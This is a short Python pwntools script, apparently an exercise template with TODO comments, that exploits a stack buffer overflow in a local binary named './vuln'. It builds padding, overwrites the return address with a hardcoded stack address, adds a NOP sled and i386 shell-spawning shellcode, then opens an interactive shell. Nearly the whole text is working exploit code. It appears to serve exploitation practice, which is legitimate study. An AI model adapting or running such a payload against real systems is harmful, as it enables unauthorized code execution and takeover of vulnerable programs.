#!/usr/bin/env python
from pwn import *

ret_offset = 68                    # TODO determine offset in buffer
buf_addr = 0xffffd068              # TODO get leak
ret_address = buf_addr+ret_offset+16 # Convenient shellcode location
payload = ''

p = process('./vuln')

# Garbage
payload += ret_offset * 'A'

# TODO Overwrite ret_address, taking endianness into account
payload += p32(ret_address)

# TODO Add nopsled
nops = '\x90' * 100
payload += nops

# TODO Assemble a shellcode from 'shellcraft' and append to payload
shellcode = asm(shellcraft.i386.linux.sh())
payload += shellcode

# Send payload
p.sendline(payload)

# Enjoy shell :-)
p.interactive()
